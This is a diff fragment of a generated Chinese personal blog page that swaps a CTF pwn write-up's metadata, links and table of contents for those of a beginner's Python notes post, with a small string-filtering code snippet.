+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">'asdefregtreytrh'</span></span><br><span class="line">lista = list(a)</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line">	<span class="keyword">if</span> i != <span class="string">'a'</span>:</span><br><span class="line">		c=c+[i]</span><br><span class="line">		</span><br><span class="line">a=<span class="string">''</span>.join(c)</span><br></pre></td></tr></table></figure>
 
 
       
@@ -443,12 +473,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2019/11/11/红帽杯pwn-wp/">红帽杯pwn wp</a></p>
+  <p><span>本文标题:</span><a href="/2020/02/24/python的初学时光/">python的初学时光</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
-  <p><span>发布时间:</span>2019年11月11日 - 22:11</p>
-  <p><span>最后更新:</span>2019年11月12日 - 17:11</p>
-  <p><span>原始链接:</span><a href="/2019/11/11/红帽杯pwn-wp/" title="红帽杯pwn wp">http://yoursite.com/2019/11/11/红帽杯pwn-wp/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/11/11/红帽杯pwn-wp/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2020年02月24日 - 18:02</p>
+  <p><span>最后更新:</span>2020年03月17日 - 21:03</p>
+  <p><span>原始链接:</span><a href="/2020/02/24/python的初学时光/" title="python的初学时光">http://yoursite.com/2020/02/24/python的初学时光/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2020/02/24/python的初学时光/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
 </div>
@@ -484,7 +514,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/11/11/红帽杯pwn-wp/" title="红帽杯pwn wp">http://yoursite.com/2019/11/11/红帽杯pwn-wp/</a>
+    <a href="http://yoursite.com/2020/02/24/python的初学时光/" title="python的初学时光">http://yoursite.com/2020/02/24/python的初学时光/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -506,8 +536,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/11/汇编笔记/" rel="next" title="汇编笔记">
-                <i class="fa fa-chevron-left"></i> 汇编笔记
+              <a href="/2019/12/02/seccomp学习笔记/" rel="next" title="seccomp学习笔记">
+                <i class="fa fa-chevron-left"></i> seccomp学习笔记
               </a>
             
           </div>
@@ -516,8 +546,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/11/18/linux系统调用表-system-call-table/" rel="prev" title="linux系统调用表(system call table)">
-                linux系统调用表(system call table) <i class="fa fa-chevron-right"></i>
+              <a href="/2020/03/10/格式化字符串解析/" rel="prev" title="格式化字符串解析">
+                格式化字符串解析 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -634,7 +664,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#python的一些小点记录"><span class="nav-number">1.</span> <span class="nav-text">python的一些小点记录</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在一行的末尾作为跨行字符串"><span class="nav-number">1.1.</span> <span class="nav-text">\在一行的末尾作为跨行字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#random模块"><span class="nav-number">1.2.</span> <span class="nav-text">random模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#decimal模块（十进制数）"><span class="nav-number">1.3.</span> <span class="nav-text">decimal模块（十进制数）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#列表的插入"><span class="nav-number">1.4.</span> <span class="nav-text">列表的插入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤器"><span class="nav-number">1.5.</span> <span class="nav-text">过滤器</span></a></li></ol></li></ol></div>
             
 
           </div>
